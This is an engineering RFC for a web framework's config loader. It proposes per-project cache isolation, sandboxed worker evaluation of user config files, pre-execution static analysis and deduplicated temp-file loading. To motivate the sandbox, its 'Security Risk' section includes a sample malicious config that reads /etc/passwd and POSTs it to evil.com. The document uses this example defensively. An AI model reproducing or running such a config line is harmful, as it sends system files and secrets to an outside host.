# 008.0: RFC - Request-Scoped Configuration

## TL;DR

**Problem**: Global config cache (`configCacheByProject`) shared across projects. Config evaluation via `import()` executes untrusted user code. Cache invalidation is incomplete.

**Solution**: Request-scoped config handling with per-project isolation and validated evaluation.

---

## The Problem

```typescript
// src/config/loader.ts:74-75
const configCacheByProject = new Map<string, { revision: number; config: VeryfrontConfig }>();
let cacheRevision = 0;  // GLOBAL across all projects
```

Three interconnected issues:

1. **Global Cache Pollution**: One pod serves multiple projects; cache key collisions possible
2. **Unsafe Code Execution**: User config is transpiled and `import()`ed with full Deno/Node permissions
3. **Incomplete Invalidation**: `clearConfigCache()` clears ALL projects, not per-project

## Issue 1: Global Config Cache

### Current State

```typescript
// src/config/loader.ts:74-75
const configCacheByProject = new Map<string, { revision: number; config: VeryfrontConfig }>();
let cacheRevision = 0;

// src/config/loader.ts:350-358
const cached = configCacheByProject.get(effectiveCacheKey);
if (cached?.revision === cacheRevision) {
  return cached.config;  // Cached config returned
}
```

### Multi-Tenancy Risk

When `clearConfigCache()` is called for Project A (e.g., during HMR):

```typescript
// src/config/loader.ts:401-404
export function clearConfigCache(): void {
  configCacheByProject.clear();  // Clears ALL projects
  cacheRevision++;               // Bumps global revision
}
```

**Timeline:**
1. T0: Project A config cached at revision 5
2. T0: Project B config cached at revision 5
3. T1: Project A triggers HMR
4. T1: `clearConfigCache()` called
5. T1: `cacheRevision` becomes 6
6. T2: Project B request arrives
7. T2: Cache miss (revision mismatch) - **Project B reloads config unnecessarily**

### Solution

```typescript
// Per-project cache with independent invalidation
interface ConfigCacheEntry {
  config: VeryfrontConfig;
  timestamp: number;
  contentHash: string;
}

const projectConfigCache = new Map<string, ConfigCacheEntry>();

export function invalidateProjectConfig(projectId: string): void {
  projectConfigCache.delete(projectId);
}

export function clearAllConfigCaches(): void {
  projectConfigCache.clear();
}
```

## Issue 2: Unsafe Config Evaluation

### Current State

```typescript
// src/config/loader.ts:257-267
const tempDir = await fs.makeTempDir({ prefix: "vf-config-" });
const tempFile = join(tempDir, "config.mjs");

try {
  await fs.writeTextFile(tempFile, js);
  const configModule = await import(`file://${tempFile}?v=${Date.now()}`);
  // User code executes with full permissions HERE
  const userConfig = configModule.default || configModule;
  return validateAndCacheConfig(userConfig, cacheKey);
} finally {
  await fs.remove(tempDir, { recursive: true });
}
```

### Security Risk

User's `veryfront.config.ts` can contain arbitrary code:

```typescript
// Malicious veryfront.config.ts
import { readFileSync } from "node:fs";

// Exfiltrate secrets during config evaluation
const secrets = readFileSync("/etc/passwd", "utf-8");
fetch("https://evil.com/steal", { method: "POST", body: secrets });

export default {
  title: "Innocent App",
};
```

This code executes with the renderer's full permissions during `import()`.

### Solution

Use Worker-based sandboxed evaluation:

```typescript
import { runInWorker } from "#veryfront/security/sandbox/deno-sandbox.ts";

async function evaluateConfigSafely(
  transpiled: string,
  cacheKey: string,
): Promise<VeryfrontConfig> {
  // Validate shape BEFORE execution where possible
  const staticAnalysis = analyzeConfigStatically(transpiled);
  if (staticAnalysis.hasNetworkCalls || staticAnalysis.hasFileSystemAccess) {
    throw new ConfigSecurityError("Config cannot contain I/O operations");
  }

  // Execute in sandboxed worker with no permissions
  const result = await runInWorker<unknown>(
    `return (async () => { ${transpiled}; return exports.default; })()`,
    { timeoutMs: 5000, memoryLimitMb: 64 },
  );

  return validateAndCacheConfig(result, cacheKey);
}
```

## Issue 3: Schema Validation After Execution

### Current State

```typescript
// src/config/loader.ts:189-208
function validateAndCacheConfig(userConfig: unknown, cacheKey: string): VeryfrontConfig {
  if (!userConfig || typeof userConfig !== "object" || Array.isArray(userConfig)) {
    throw new ConfigValidationError(...);
  }

  validateCorsConfig(userConfig);      // Validation happens AFTER code ran
  validateConfigShape(userConfig);     // Zod schema validation

  const merged = mergeConfigs(userConfig as Partial<VeryfrontConfig>);
  // ...
}
```

### Risk

By the time validation runs, the user's config module has already executed. Any side effects (network calls, file writes, global mutations) have already occurred.

### Solution

Pre-execution static analysis + post-execution validation:

```typescript
async function loadConfigSecurely(
  configPath: string,
  adapter: RuntimeAdapter,
): Promise<VeryfrontConfig> {
  const source = await adapter.fs.readFile(configPath);

  // 1. Static analysis BEFORE transpilation
  const staticIssues = analyzeConfigSource(source);
  if (staticIssues.length > 0) {
    throw new ConfigSecurityError(`Config contains prohibited patterns: ${staticIssues.join(", ")}`);
  }

  // 2. Transpile
  const transpiled = await transpileConfig(source, configPath);

  // 3. Execute in sandbox
  const result = await evaluateInSandbox(transpiled);

  // 4. Validate schema
  return validateAndCacheConfig(result, buildCacheKey(configPath, adapter));
}
```

## Issue 4: Temp File Race Condition

### Current State

```typescript
// src/config/loader.ts:257-267
const tempDir = await fs.makeTempDir({ prefix: "vf-config-" });
const tempFile = join(tempDir, "config.mjs");

await fs.writeTextFile(tempFile, js);
const configModule = await import(`file://${tempFile}?v=${Date.now()}`);
```

### Risk

1. Concurrent config loads for same project could use same temp path
2. Temp file cleanup happens in `finally` but import is async
3. File could be deleted while import is in progress

### Solution

Use content-hash-based temp files with deduplication:

```typescript
const inProgress = new Map<string, Promise<VeryfrontConfig>>();

async function loadConfig(
  configPath: string,
  adapter: RuntimeAdapter,
): Promise<VeryfrontConfig> {
  const content = await adapter.fs.readFile(configPath);
  const contentHash = await hashContent(content);
  const cacheKey = `${configPath}:${contentHash}`;

  // Deduplicate concurrent loads
  const existing = inProgress.get(cacheKey);
  if (existing) return existing;

  const promise = doLoadConfig(content, configPath, contentHash);
  inProgress.set(cacheKey, promise);

  try {
    return await promise;
  } finally {
    inProgress.delete(cacheKey);
  }
}
```
